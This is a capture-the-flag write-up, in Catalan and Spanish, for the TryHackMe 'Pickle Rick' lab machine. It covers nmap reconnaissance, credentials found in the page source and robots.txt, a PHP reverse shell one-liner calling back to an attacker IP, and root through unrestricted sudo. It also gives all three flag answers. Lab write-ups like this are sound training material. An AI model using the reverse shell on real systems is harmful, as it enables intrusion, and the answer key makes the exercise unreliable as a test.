# Pickle Rick

Plataforma: TryHackMe
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 15 de diciembre de 2024 18:59
IP: 10.10.21.47

# **Reconocimiento**

> NMAP INICIAL
> 

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.21.47 -oG allports
```

![image.png](<imagenes/image 12.png>)

> NMAP Servicios
> 

```bash
 nmap -sV -script=http-enum 10.10.21.47 -vvv -oN targeted
```

![image.png](<imagenes/image 13.png>)

# Análisis de vulnerabilidades

Código fuente

![image.png](<imagenes/image 14.png>)

Username : R1ckRul3s

Accedirm a /robots.txt

![image.png](<imagenes/image 15.png>)

Accedim a /login.php i provem les credencials

![image.png](<imagenes/image 16.png>)

Llistem arxius i trobem :

**Sup3rS3cretPickl3Ingred.txt**

Si provem a obrirlo amb "CAT" ens diu que no podem executar aquest comando. Provem amb less i amb more:

> Flag 1r ingredient :	**mr. meeseek hair**
> 

# Explotación de vulnerabilidades

Intentem conectarnos amb una rever shell i la que ens funciona es una PHPexec:

```bash
php -r '$sock=fsockopen("10.9.4.64",443);exec("bash <&3 >&3 2>&3");'
```

![image.png](<imagenes/image 17.png>)

Accedim al sistema :

Busquem diferents fichers:

![image.png](<imagenes/image 18.png>)

Entrem al home de rick i trobem el segon flag

> Flag 2n ingredient: **1 jerry tear**
> 

# Escalada de privilegios

Busquem com ens podem convertir en root:

```bash
sudo -l
```

![image.png](<imagenes/image 19.png>)

Podem executar qualsevol comando sense password

```bash
sudo /bin/bash
```

Busquem al directori root la ultima flag:

> Flag 3: **fleeb juice**
>